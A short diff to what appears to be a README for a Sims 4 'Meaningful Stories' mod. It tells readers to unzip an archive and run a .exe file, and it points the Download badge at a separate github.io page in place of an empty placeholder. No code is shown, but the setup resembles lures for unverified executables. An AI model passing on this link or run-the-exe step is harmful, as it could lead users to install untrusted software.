@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://sims4-meaningful-stories.github.io/.github/)
 
 ## 📸 Overview
 <img width="425" height="296" alt="sims4-meaningfulstories-emotions" src="https://github.com/user-attachments/assets/ecb6f44c-aa80-4d81-a11d-fe4019726c5f" />
